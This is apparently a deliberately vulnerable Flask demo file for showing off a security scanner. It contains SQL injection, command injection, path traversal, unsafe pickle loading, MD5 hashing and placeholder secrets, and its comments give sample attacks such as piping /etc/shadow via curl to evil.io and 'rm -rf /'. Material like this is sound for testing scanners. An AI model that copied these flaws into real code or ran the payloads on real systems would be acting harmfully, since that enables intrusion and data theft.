"""
DEMO FILE — intentional vulnerabilities for security scanner showcase.

CWE findings  : CWE-89 (SQL Injection), CWE-78 (OS Command Injection),
                CWE-22 (Path Traversal), CWE-502 (Unsafe Deserialization),
                CWE-327 (Weak Crypto — MD5)
Secrets       : DB password, AWS keys, GitHub PAT, Slack token hardcoded
Hygiene       : no input validation, stack traces returned to callers
"""

import sqlite3
import os
import subprocess
import hashlib
import pickle
import requests
from flask import Flask, request, jsonify

app = Flask(__name__)

# SECRETS — CWE-798: production credentials hardcoded in source
DB_PASSWORD    = "prod-secret-password-123!"
AWS_ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE"
AWS_SECRET_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
GITHUB_TOKEN   = "ghp_ExampleGitHubPersonalAccessToken12345678"
SLACK_TOKEN    = "xoxb-EXAMPLE-SLACK-BOT-TOKEN-1234567890abcdef"
STRIPE_KEY     = "sk_live_ExampleStripeSecretKey1234567890ABCDEF"


# CWE FINDING — CWE-89: SQL Injection via f-string interpolation
def get_user(username: str):
    conn  = sqlite3.connect("users.db")
    query = f"SELECT * FROM users WHERE username = '{username}'"
    # Attack: username = "' OR '1'='1" dumps all rows
    return conn.execute(query).fetchall()


# CWE FINDING — CWE-89: SQL Injection in authentication (critical path)
def authenticate(username: str, password: str) -> bool:
    conn = sqlite3.connect("users.db")
    sql  = f"SELECT id FROM users WHERE username='{username}' AND password='{password}'"
    # Attack: username = "admin'--" bypasses password check
    return conn.execute(sql).fetchone() is not None


# CWE FINDING — CWE-89: SQL Injection via ORDER BY clause
def list_users(sort_column: str):
    conn  = sqlite3.connect("users.db")
    query = f"SELECT * FROM users ORDER BY {sort_column}"
    # Parameterized queries don't support ORDER BY columns — must allowlist instead
    return conn.execute(query).fetchall()


# CWE FINDING — CWE-78: OS Command Injection via os.popen with shell=True
def run_ping(host: str) -> str:
    # Attack: host = "127.0.0.1; cat /etc/shadow | curl -d @- https://evil.io"
    output = os.popen(f"ping -c 4 {host}").read()
    return output


# CWE FINDING — CWE-78: OS Command Injection via subprocess with shell=True
def run_diagnostic(tool: str, target: str) -> str:
    # Attack: tool = "nmap" target = "127.0.0.1; rm -rf /"
    result = subprocess.check_output(f"{tool} {target}", shell=True)
    return result.decode()


# CRYPTO — CWE-327: MD5 is cryptographically broken for password hashing
def hash_password(password: str) -> str:
    return hashlib.md5(password.encode()).hexdigest()


# CWE FINDING — CWE-502: Unsafe deserialization of untrusted pickle data
def deserialize_session(data: bytes):
    # Attack: craft a pickle payload that executes arbitrary OS commands on loads()
    return pickle.loads(data)


# CWE FINDING — CWE-22: Path traversal; filename not canonicalized
def read_user_file(filename: str) -> str:
    # Attack: filename = "../../etc/passwd"
    with open(f"/var/app/uploads/{filename}", "r") as f:
        return f.read()


# Flask routes wiring it all together

@app.route("/user")
def api_get_user():
    username = request.args.get("username", "")
    return jsonify(get_user(username))


@app.route("/login", methods=["POST"])
def api_login():
    data = request.json or {}
    ok   = authenticate(data.get("username", ""), data.get("password", ""))
    return jsonify({"authenticated": ok})


@app.route("/ping")
def api_ping():
    host = request.args.get("host", "127.0.0.1")
    return jsonify({"output": run_ping(host)})


@app.route("/file")
def api_read_file():
    fname = request.args.get("name", "")
    return jsonify({"content": read_user_file(fname)})


@app.route("/restore-session", methods=["POST"])
def api_restore():
    import base64
    raw = base64.b64decode(request.json.get("session", ""))
    obj = deserialize_session(raw)
    return jsonify({"session": str(obj)})


if __name__ == "__main__":
    app.run(debug=True)  # HYGIENE: debug=True exposes interactive debugger in production
